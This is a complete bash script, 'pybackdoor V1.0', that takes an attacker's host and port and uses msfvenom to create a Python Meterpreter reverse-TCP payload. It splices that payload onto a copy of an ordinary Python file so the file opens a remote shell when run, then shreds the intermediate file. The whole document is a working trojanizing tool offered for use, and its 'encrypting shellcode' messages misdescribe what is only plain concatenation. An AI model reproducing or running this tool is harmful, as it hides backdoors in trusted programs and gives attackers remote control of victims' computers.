#!/bin/bash
# pybackdoor V1.0

clear
figlet -f big PYBACKDOOR
echo ""
read -p "[ + ] LHOST : " lh
echo ""
read -p "[ + ] LPORT : " lp
echo ""
read -p "[ + ] path to Original File [ PYTHON ] : " pyfile
echo ""
sleep 0.5
echo "[ * ] Generating the payload ..." | pv -qL 10
echo ""
xterm -T "Creating Payload ..." -e "msfvenom -p python/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -o temp.txt" & > /dev/null2>&1
PID=$!
wait $PID
sleep 1
echo "[ # ] Encrypting shellcode ..." | pv -qL 10
echo ""
cat temp.txt > $(basename $pyfile)
echo '' >> $(basename $pyfile)
cat $pyfile >> $(basename $pyfile)
sleep 0.5
echo "[ + ] Shellcode encrypted ..." | pv -qL 10
echo ""
sleep 1
echo "[ + ] payload saved in folder --> $PWD/$(basename $pyfile)" | pv -qL 10
echo ""
sleep 1.5
echo "[ + ] Cleaning up ... " | pv -qL 10
echo ""
shred -n 5 temp.txt -u
echo "[ + ] OK ... " | pv -qL 10
echo ""
sleep 1.1
exit

